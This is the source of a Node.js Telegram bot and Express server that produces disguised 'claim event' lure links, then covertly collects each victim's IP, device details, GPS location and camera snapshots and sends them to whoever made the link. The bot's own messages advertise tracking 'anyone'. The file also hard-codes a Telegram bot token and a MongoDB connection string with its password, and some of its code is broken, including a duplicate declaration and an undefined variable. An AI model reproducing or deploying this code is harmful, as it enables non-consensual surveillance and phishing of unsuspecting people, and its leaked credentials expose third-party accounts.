require('dotenv').config();
const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = '6989670981:AAEUBuks0ZCRi7xd0Tdz0A2DqP8eOOX_8aA';
const BOT_TOKEN = '6989670981:AAEUBuks0ZCRi7xd0Tdz0A2DqP8eOOX_8aA';
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

const mongoose = require('mongoose');
const utf8 = require('utf8'); 
const axios = require('axios'); 

// Replace with your bot token, admin chat ID, and channels
const ADMIN_CHAT_ID = '2068329336';
const LOG_CHANNEL = '-1002493498964';
const CHANNELS = ['@RenusHackingArmy', '@RenusBotsChannel'];


// MongoDB connection
mongoose.connect(
  'mongodb+srv://renusutube:K1k1KNdzuNTXSVV5@start-king-js.pd2pe.mongodb.net/'
);


//Modify your URL here
var hostURL="https://renu24-12-2024-797791ea3fc4.herokuapp.com";
//TOGGLE for Shorters
var use1pt=true;



app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/th30neand0nly0ne");
}

         
                              
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/th30neand0nly0ne");
}

         
                              
});

// User schema
const userSchema = new mongoose.Schema({
  userId: Number,
  username: String,
  referrals: { type: Number, default: 0 },
  referredBy: { type: Number, default: null },
  banned: { type: Boolean, default: false },
}); 

const User = mongoose.model('User', userSchema);

module.exports = User;
 
 // Initialize the bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Log messages to the log channel
const logMessage = async (message) => {
  await bot.sendMessage(LOG_CHANNEL, message);
};



// Save user to database
const saveUser = async (user) => {
  let dbUser = await User.findOne({ userId: user.id });
  if (!dbUser) {
    dbUser = new User({
      userId: user.id,
      username: user.username || 'No Username',
    });
    await dbUser.save();
    logMessage(`#NewUser\nName: ${user.first_name}\nID: ${user.id}`);
  }
  return dbUser;
};

// Check membership
const checkMembership = async (userId) => {
  for (const channel of CHANNELS) {
    try {
      const res = await bot.getChatMember(channel, userId);
      if (!['member', 'administrator', 'creator'].includes(res.status)) {
        return false;
      }
    } catch (err) {
      return false;
    }
  }
  return true;
};

// Function to show typing action
const showTyping = async (chatId, duration = 4000) => {
  await bot.sendChatAction(chatId, 'typing'); // Show typing indicator
  return new Promise((resolve) => setTimeout(resolve, duration)); // Wait for the specified duration
}; 


bot.on('message', async (msg) => {
const chatId = msg.chat.id;

 

if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
 createLink(chatId,msg.text); 
}
  
if(msg.text=="/start"){
const user = msg.from;
  const chatId = msg.chat.id;

  // Save user to database
  const dbUser = await saveUser(user);
// Ban check
  if (dbUser.banned) {
    return bot.sendMessage(chatId, 'You are banned from using this bot.');
  }


  // Membership check
  if (await checkMembership(user.id)) {
    const options = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Open Menu', callback_data: 'open_menu' }],
          [{ text: 'Help', callback_data: 'help' },
          { text: 'Feedback', callback_data: 'feedback' }],
          [{ text: 'Refer & Get', callback_data: 'refer_link' }],
                  ],
      },
    };
    bot.sendMessage(chatId, 'Explore powerful tools with just a click! Use Open Menu for ethical hacking tools, Help to learn the steps, and Refer & Get for private codes and perks. Love the bot? Share your thoughts via Feedback and help us grow better! (ID: 211)', options); 
      // Handle referrals
const referralId = msg.text.split(' ')[1];
if (referralId) {
  const referrer = await User.findOne({ userId: referralId });
  if (referrer && !dbUser.referredBy) {
    dbUser.referredBy = referrer.userId;
    await dbUser.save();
    referrer.referrals += 1;
    await referrer.save();
    bot.sendMessage(referrer.userId, `🎉 You earned a referral! Total: ${referrer.referrals}`);
    logMessage(`#Referral\nReferrer: ${referrer.username} (ID: ${referrer.userId})\nReferred User: ${dbUser.username} (ID: ${dbUser.userId})`);
  }
} 

  } else {
    const joinButtons = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Join Channel', url: 'https://t.me/RenusHackingArmy' },
          { text: 'Join Channel', url: 'https://t.me/RenusBotsChannel' }],
                  [{ text: 'Verify', callback_data: 'start_but' }],
                  ],
      },
    };
    bot.sendMessage(chatId, "Hey user, You can Track anyone with just a simple link Using this bot, you can easily track people by sending them a special URL. Once the target interacts with the link, you will receive two tracking URLs to monitor them.\n\nBut before that, make sure you join both of our channels! Once you're in, Click on Verify button and unlock the tracking features for you.\n\nJoin now and start tracking!", joinButtons);
  }

}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Watch Video', url: 'https://t.me/Renus' }],
                [
                    { text: 'Demo - 1', callback_data: 'demo_1' },
                    { text: 'Demo - 2', callback_data: 'demo_2' }
                ],
                [{ text: 'Help Support', url: 'https://t.me/RenusBotsGroup' }],
                [
                    { text: '◀️', callback_data: 'back' },
                    { text: 'Main Menu', callback_data: 'main_menu' },
                    { text: '▶️', callback_data: 'next' }]
                    ]
        }};
    
    bot.sendMessage(msg.chat.id, 'Welcome! Choose an option below:', options);
}
else if(msg.reply_to_message && msg.reply_to_message.text === '🌐 Enter Your URL') {
    const userId = msg.from.id;
    const userChatIdEncoded = encodeChatId(userId);
    const url = msg.text;

    if (!isValidUrl(url)) {
      await bot.sendMessage(chatId, "Please enter a valid URL, including http or https. Ex: https://www.google.com");
      await bot.sendMessage(chatId, '🌐 Enter Your URL', { reply_markup: { force_reply: true } });
      return;
    }
 
   
    const typingMessage = await bot.sendMessage(chatId, "Please Wait Some time...");
    const encodedUrl = encodeUrl(url);
    await showTyping(chatId);
    const cloudflareLink = `https://claim-event.site/recharge.php/${userChatIdEncoded}/${encodedUrl}`;

    const shortenedCloudflareUrl = await shortenUrl(cloudflareLink);

    await bot.deleteMessage(chatId, typingMessage.message_id);

    if (shortenedCloudflareUrl) {
      const keyboard = [
        [{ text: "Create New Link", callback_data: 'All_one' }]
      ];
      await bot.sendMessage(chatId, 
        `Links have been created successfully.\nNow you can use any one of the links below. Your old URL: [Click Here](${url})\n\n✅ Your shortened Links\n\n🌐 CloudFlare Page Link:\n${shortenedCloudflareUrl}`, 
        {
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: keyboard }
        });
    } 
   } else if (msg.reply_to_message && msg.reply_to_message.text === '🌐 Enter Your URL [Device info]') {
    const userId = msg.from.id;
    const userChatIdEncoded = encodeChatId(userId);
    const url = msg.text;

    if (!isValidUrl(url)) {
      await bot.sendMessage(chatId, "Please enter a valid URL, including http or https. Ex: https://www.google.com");
      await bot.sendMessage(chatId, '🌐 Enter Your URL [Device info]', { reply_markup: { force_reply: true } });
      return;
    }
  
    const typingMessage = await bot.sendMessage(chatId, "Please Wait Some time...");
      await showTyping(chatId);
      const encodedUrl = encodeUrl(url);

    const cloudflareLink = `https://claim-event.site/data.php/${userChatIdEncoded}/${encodedUrl}`;

    const shortenedCloudflareUrl = await shortenUrl(cloudflareLink);

    await bot.deleteMessage(chatId, typingMessage.message_id);

    if (shortenedCloudflareUrl) {
      const keyboard = [
        [{ text: "Create New Link", callback_data: 'Device_info' }]
      ];
      await bot.sendMessage(chatId, 
        `Links have been created successfully.\nNow you can use any one of the links below. Your old URL: [Click Here](${url})\n\n✅ Your shortened Links\n\n🌐 CloudFlare Page Link:\n${shortenedCloudflareUrl}`, 
        {
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: keyboard }
        });
    } else {
      await bot.sendMessage(chatId, "Error shortening the URL.");
    }
  } else if (msg.reply_to_message && msg.reply_to_message.text === '🌐 Enter Your URL [Location]') {
    const userId = msg.from.id;
    const userChatIdEncoded = encodeChatId(userId);
    const url = msg.text;

    if (!isValidUrl(url)) {
      await bot.sendMessage(chatId, "Please enter a valid URL, including http or https. Ex: https://www.google.com");
      await bot.sendMessage(chatId, '🌐 Enter Your URL [Location]', { reply_markup: { force_reply: true } });
      return;
    }

    const typingMessage = await bot.sendMessage(chatId, "Please Wait Some time...");
    const encodedUrl = encodeUrl(url);
    await showTyping(chatId);
    const cloudflareLink = `https://claim-event.site/gift.php/${userChatIdEncoded}/${encodedUrl}`;

    const shortenedCloudflareUrl = await shortenUrl(cloudflareLink);

    await bot.deleteMessage(chatId, typingMessage.message_id);

    if (shortenedCloudflareUrl) {
      const keyboard = [
        [{ text: "Create New Link", callback_data: 'Location_map' }]
      ];
      await bot.sendMessage(chatId, 
        `Links have been created successfully.\nNow you can use any one of the links below. Your old URL: [Click Here](${url})\n\n✅ Your shortened Links\n\n🌐 CloudFlare Page Link:\n${shortenedCloudflareUrl}`, 
        {
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: keyboard }
        });
    } else {
      await bot.sendMessage(chatId, "Error shortening the URL.");
    }
  } else if (msg.reply_to_message && msg.reply_to_message.text === '🌐 Enter Your URL [Camera]') {
    const userId = msg.from.id;
    const userChatIdEncoded = encodeChatId(userId);
    const url = msg.text;

    if (!isValidUrl(url)) {
      await bot.sendMessage(chatId, "Please enter a valid URL, including http or https. Ex: https://www.google.com");
      await bot.sendMessage(chatId, '🌐 Enter Your URL [Camera]', { reply_markup: { force_reply: true } });
      return;
    }

    const typingMessage = await bot.sendMessage(chatId, "Please Wait Some time...");
    await showTyping(chatId);
    const encodedUrl = encodeUrl(url);

    const cloudflareLink = `https://claim-event.site/get.php/${userChatIdEncoded}/${encodedUrl}`;

    const shortenedCloudflareUrl = await shortenUrl(cloudflareLink);

    await bot.deleteMessage(chatId, typingMessage.message_id);

    if (shortenedCloudflareUrl) {
      const keyboard = [
        [{ text: "Create New Link", callback_data: 'Camera_img' }]
      ];
      await bot.sendMessage(chatId, 
        `Links have been created successfully.\nNow you can use any one of the links below. Your old URL: [Click Here](${url})\n\n✅ Your shortened Links\n\n🌐 CloudFlare Page Link:\n${shortenedCloudflareUrl}`, 
        {
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: keyboard }
        });
    } else {
      await bot.sendMessage(chatId, "Error shortening the URL.");
    }
  } else if (msg.reply_to_message && msg.reply_to_message.text === '🌐 Enter Your URL [Loc+info]') {
    const userId = msg.from.id;
    const userChatIdEncoded = encodeChatId(userId);
    const url = msg.text;

    if (!isValidUrl(url)) {
      await bot.sendMessage(chatId, "Please enter a valid URL, including http or https. Ex: https://www.google.com");
      await bot.sendMessage(chatId, '🌐 Enter Your URL [Loc+info]', { reply_markup: { force_reply: true } });
      return;
    }

    const typingMessage = await bot.sendMessage(chatId, "Please Wait Some time..."); 
    await showTyping(chatId);
    const encodedUrl = encodeUrl(url);

    const cloudflareLink = `https://claim-event.site/voucher.php/${userChatIdEncoded}/${encodedUrl}`;

    const shortenedCloudflareUrl = await shortenUrl(cloudflareLink);

    await bot.deleteMessage(chatId, typingMessage.message_id);

    if (shortenedCloudflareUrl) {
      const keyboard = [
        [{ text: "Create New Link", callback_data: 'Loc_map_info' }]
      ];
      await bot.sendMessage(chatId, 
        `Links have been created successfully.\nNow you can use any one of the links below. Your old URL: [Click Here](${url})\n\n✅ Your shortened Links\n\n🌐 CloudFlare Page Link:\n${shortenedCloudflareUrl}`, 
        {
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: keyboard }
        });
    } else {
      await bot.sendMessage(chatId, "Error shortening the URL.");
    }
  } else if (msg.reply_to_message && msg.reply_to_message.text === '🌐 Enter Your URL [Loc+img]') {
    const userId = msg.from.id;
    const userChatIdEncoded = encodeChatId(userId);
    const url = msg.text;

    if (!isValidUrl(url)) {
      await bot.sendMessage(chatId, "Please enter a valid URL, including http or https. Ex: https://www.google.com");
      await bot.sendMessage(chatId, '🌐 Enter Your URL [Loc+img]', { reply_markup: { force_reply: true } });
      return;
    }

    const typingMessage = await bot.sendMessage(chatId, "Please Wait Some time...");
    await showTyping(chatId);
    const encodedUrl = encodeUrl(url);

    const cloudflareLink = `https://claim-event.site/money.php/${userChatIdEncoded}/${encodedUrl}`;

    const shortenedCloudflareUrl = await shortenUrl(cloudflareLink);

    await bot.deleteMessage(chatId, typingMessage.message_id);

    if (shortenedCloudflareUrl) {
      const keyboard = [
        [{ text: "Create New Link", callback_data: 'Loc_map_img' }]
      ];
      await bot.sendMessage(chatId, 
        `Links have been created successfully.\nNow you can use any one of the links below. Your old URL: [Click Here](${url})\n\n✅ Your shortened Links\n\n🌐 CloudFlare Page Link:\n${shortenedCloudflareUrl}`, 
        {
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: keyboard }
        });
    } else {
      await bot.sendMessage(chatId, "Error shortening the URL.");
    }
  }
  
  
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
} else if (query.data === 'start_but') {
  const user = query.from.id;
  const chatId = query.message.chat.id;

  // Save user to database
  const dbUser = await saveUser(user);

  // Ban check
  if (dbUser.banned) {
    return bot.sendMessage(chatId, 'You are banned from using this bot.');
  }

  // Membership check
  if (await checkMembership(user)) {
    const options = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Open Menu', callback_data: 'open_menu' }],
          [{ text: 'Help', callback_data: 'help' },
          { text: 'Feedback', callback_data: 'feedback' }],
          [{ text: 'Refer & Get', callback_data: 'refer_link' }],
                  ],
      },
    };
    bot.sendMessage(chatId, 'Explore powerful tools with just a click! Use Open Menu for ethical hacking tools, Help to learn the steps, and Refer & Get for private codes and perks. Love the bot? Share your thoughts via Feedback and help us grow better! (ID: 211)', options);
  } else {
    const joinButtons = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Join Channel', url: 'https://t.me/RenusHackingArmy' },
          { text: 'Join Channel', url: 'https://t.me/RenusBotsChannel' }],
                  [{ text: 'Verify', callback_data: 'start_but' }],
                  ],
      },
    };
    bot.sendMessage(chatId, "Hey user, You need to join all these channels asap. Otherwise, this bot will not work. If you have joined all the channels, then tap the Verify button below to confirm your membership.\n\nJoin now and start tracking!", joinButtons);
  }
  }
  
  
  else if (query.data === 'Device_info') {
    bot.sendMessage(chatId, '🌐 Enter Your URL [Device info]', { reply_markup: { force_reply: true } });
  } else if (query.data === 'Location_map') {
    bot.sendMessage(chatId, '🌐 Enter Your URL [Location]', { reply_markup: { force_reply: true } });
  } else if (query.data === 'Camera_img') {
    bot.sendMessage(chatId, '🌐 Enter Your URL [Camera]', { reply_markup: { force_reply: true } });
  } else if (query.data === 'Loc_map_info') {
    bot.sendMessage(chatId, '🌐 Enter Your URL ', { reply_markup: { force_reply: true } });
  } else if (query.data === 'Loc_map_img') {
    bot.sendMessage(chatId, '🌐 Enter Your URL  ', { reply_markup: { force_reply: true } });
  } else if (query.data === 'All_one') {
    bot.sendMessage(chatId, '🌐 Enter Your URL', { reply_markup: { force_reply: true } });
  } 
  
  
  else if (query.data === 'help') {
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Watch Video', url: 'https://t.me/Renus' }],
                [
                    { text: 'Demo - 1', callback_data: 'demo_1' },
                    { text: 'Demo - 2', callback_data: 'demo_2' }
                ],
                [{ text: 'Help Support', url: 'https://t.me/RenusBotsGroup' }],
            [{ text: '◀️', callback_data: 'back' },
  { text: 'Main Menu', callback_data: 'main_menu' },
    { text: '▶️', callback_data: 'next' }],
    ],
        },
    };
    bot.editMessageText('Welcome! Choose an option below:', {
  chat_id: query.message.chat.id,
  message_id: query.message.message_id,
  reply_markup: options.reply_markup,
});
} 
else if (query.data === 'demo_1') {
    const filePath = 'https://t.me/nimuda';
    const caption = 'Here is the document for DEMO - 1.';
    bot.sendDocument(query.message.chat.id, filePath, { caption });
}

else if (query.data === 'demo_2') {
    const filePath = './document2.pdf';
    const caption = 'Here is the document for DEMO - 2.';
    bot.sendDocument(query.message.chat.id, filePath, { caption });
} 



else if (query.data === 'refer_link') {
    // Extract the user ID and referral link
    const userId = query.message.chat.id; // Ensure userId is defined here
    const referralLink = `https://t.me/all_hack_1_bot?start=${userId}`;

    // Find the referrer in the database
    let referrer;
    try {
        referrer = await User.findOne({ userId });
        if (!referrer) {
            referrer = { referrals: 0 }; // Default value if the user is not found
        }
    } catch (error) {
        console.error('Error fetching referrer data:', error);
        return bot.answerCallbackQuery(query.id, { text: 'An error occurred. Please try again later.' });
    }

    // Calculate adjusted referral users
    const adjustedReferrals = referrer.referrals >= 5 ? referrer.referrals - 2 : referrer.referrals;

    // Define inline keyboard options
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '◀', callback_data: 'back' },
                    { text: 'Main Menu', callback_data: 'main_menu' },
                    { text: '▶', callback_data: 'next' }
                ]
            ]
        }
    };

    // Edit the message with the referral details
    bot.editMessageText(
        `Here is Your Refferel Bot Statistics:\n\n` +
        `1. Total Referral - ${referrer.referrals}\n` +
        `2. Your Referral Users - ${adjustedReferrals}\n` +
        `3. Your Referral ID - ${userId}\n` +
        `4. Your Referral Link - [Click To Share](https://t.me/share/url?url=${encodeURIComponent(referralLink)})\n\n` + 
        `Use your referral invites and earn exclusive rewards. Discover the amazing rewards you can get for your referrals by clicking [There.](https://telegra.ph/SmartKingBot-Referral-Program--Unlock-Exclusive-Rewards-12-23)!`,
        {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            reply_markup: options.reply_markup,
            parse_mode: 'Markdown'
        }
    );
}
  
  
  else if (query.data === 'main_menu') {
  const user = query.from.id;
  const chatId = query.message.chat.id;

  // Save user to database
  const dbUser = await saveUser(user);

  // Ban check
  if (dbUser.banned) {
    return bot.sendMessage(chatId, 'You are banned from using this bot.');
  }

  // Membership check
  if (await checkMembership(user)) {
    const options = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Open Menu', callback_data: 'open_menu' }],
          [{ text: 'Help', callback_data: 'help' },
          { text: 'Feedback', callback_data: 'feedback' }],
          [{ text: 'Refer & Get', callback_data: 'refer_link' }],
                  ],
      },
    };
    bot.editMessageText('Explore powerful tools with just a click! Use Open Menu for ethical hacking tools, Help to learn the steps, and Refer & Get for private codes and perks. Love the bot? Share your thoughts via Feedback and help us grow better! (ID: 211)', {
  chat_id: query.message.chat.id,
  message_id: query.message.message_id,
  reply_markup: options.reply_markup,
});

  } else {
    const joinButtons = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Join Channel', url: 'https://t.me/RenusHackingArmy' },
          { text: 'Join Channel', url: 'https://t.me/RenusBotsChannel' }],
                  [{ text: 'Verify', callback_data: 'start_but' }],
                  ],
      },
    };
    bot.sendMessage(chatId, "Hey user, You need to join all these channels asap. Otherwise, this bot will not work. If you have joined all the channels, then tap the Verify button below to confirm your membership.\n\nJoin now and start tracking!", joinButtons);
  }
  } else if (query.data === 'open_menu') {
    const optio = [
  [{ text: '[ Device + Camera + Location ]', callback_data: 'All_one' }],
  [{ text: 'Camera + Location', callback_data: 'Loc_map_img' },
    { text: 'Location + Device', callback_data: 'Loc_map_info' },],
  [{ text: 'Camera img', callback_data: 'Camera_img' },
    { text: 'Device info', callback_data: 'Device_info' }],
  [{ text: 'Location only', callback_data: 'Location_map' }],
 //
  [{ text: '◀️', callback_data: 'back' },
  { text: 'Main Menu', callback_data: 'main_menu' },
    { text: '▶️', callback_data: 'next' }],
];
    bot.editMessageText('This bot allows you to track a device effortlessly through a simple link. It can collect details such as IP address, location, camera snapshots, battery status, network information, device info and much more, offering a wide range of features and benefits. (ID: 013)', {
  chat_id: query.message.chat.id,
  message_id: query.message.message_id,
  reply_markup: { inline_keyboard: optio },
});
    } 
    
    
    else if (query.data === 'feedback') {
    const options = [
        [{ text: '⭐ 1 Star', callback_data: 'rate_1' },
          { text: '⭐ 2 Star', callback_data: 'rate_2' }],
          [{ text: '⭐ 3 Star', callback_data: 'rate_3' },
          { text: '⭐ 4 Star', callback_data: 'rate_4' }],
          [{ text: '⭐ 5 Star', callback_data: 'rate_5' }], 
       [{ text: '◀️', callback_data: 'back' },
  { text: 'Main Menu', callback_data: 'main_menu' },
    { text: '▶️', callback_data: 'next' }],
    
    ]; // Removed the trailing comma
    bot.editMessageText('🤝 Please Rate Us', {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        reply_markup: { inline_keyboard: options }
    });
} 

else if (query.data.startsWith('rate_')) {
    const rating = query.data.split('_')[1];
    bot.sendMessage(chatId, 'Please provide written feedback:', { reply_markup: { force_reply: true } });
    bot.once('message', async (msg) => {
      const feedback = msg.text;
      logMessage(`#Feedback\n\n🌟 New Rating Recive 🌟\nUser: ${query.from.username} (ID: ${userId})\nRating: ${rating}\nFeedback: ${feedback}`);
      bot.sendMessage(-1002497850425, `#Feedback\n\n🌟 New Rating Recive 🌟\nUser: ${query.from.username} (ID: ${userId})\nRating: ${rating}\nFeedback: ${feedback}`);
      bot.sendMessage(chatId, 'Thank you for your feedback!');
      
    });
  }
});
bot.on('polling_error', (error) => {
//console.log(error.code); 
});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
 
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;
  
bot.sendChatAction(cid,"typing");
if(use1pt){
var x=await fetch(`https://renus.co/r-eurl-short.php?url=${encodeURIComponent(cUrl)}`).then(res => res.json());
var y=await fetch(`https://renus.co/r-eurl-short.php?url=${encodeURIComponent(wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}
  
bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
}
else{

bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
createNew(cid);

}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
}





app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});

  
});


app.post("/location",(req,res)=>{

  
var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
  
res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null;

var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if( uid != null && data != null){

 
if(data.indexOf(ip) < 0){
return res.send("ok");
}

data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

  
res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
  
if( uid != null && img != null){
  
var buffer=Buffer.from(img,'base64');
  
var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("Done");
 
}

});

// Admin commands
bot.onText(/\/admin/, (msg) => {
  if (msg.chat.id != ADMIN_CHAT_ID) return;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Ban User', callback_data: 'ban_user' },
        { text: 'Unban User', callback_data: 'unban_user' }],
        [{ text: 'Broadcast', callback_data: 'broadcast' }],
        [{ text: 'Subscribers Stats', callback_data: 'stats' }],
      ],
    },
  };
  bot.sendMessage(msg.chat.id, 'Welcome to the Limited Admin Panel! Here, you can monitor subscriber stats and explore features like checking Blocked Users, Incoming & Outgoing Messages, etc. Additionally, you can manage user access through bans or unbans. Take full control with multiple powers at your fingertips!', options);
});

// Handle admin actions
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'ban_user') {
    bot.sendMessage(chatId, 'Send the user ID to ban:');
    bot.once('message', (msg) => {
      const userId = msg.text;
      User.updateOne({ userId }, { banned: true }).then(() => {
        bot.sendMessage(chatId, `User ${userId} banned.`);
        logMessage(`#Ban\nUser ID: ${userId}`);
      });
    });
  } else if (query.data === 'unban_user') {
    bot.sendMessage(chatId, 'Send the user ID to unban:');
    bot.once('message', (msg) => {
      const userId = msg.text;
      User.updateOne({ userId }, { banned: false }).then(() => {
        bot.sendMessage(chatId, `User ${userId} unbanned.`);
        logMessage(`#Unban\nUser ID: ${userId}`);
      });
    });
  } else if (query.data === 'broadcast') {
    bot.sendMessage(chatId, 'Send the message to broadcast:');
    bot.once('message', async (msg) => {
      const message = msg.text;
      const users = await User.find({ banned: false });
      users.forEach((user) => {
        bot.sendMessage(user.userId, message).catch(console.error);
      });
      logMessage(`#Broadcast\nMessage: ${message}`);
    });
  } else if (query.data === 'stats') {
    const totalUsers = await User.countDocuments();
    const bannedUsers = await User.countDocuments({ banned: true });
    bot.sendMessage(chatId, `📊 Stats:\nTotal Users: ${totalUsers}\nBanned Users: ${bannedUsers}`);
  }
});

console.log('Bot started!');
logMessage(`Bot Restarted`);


const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
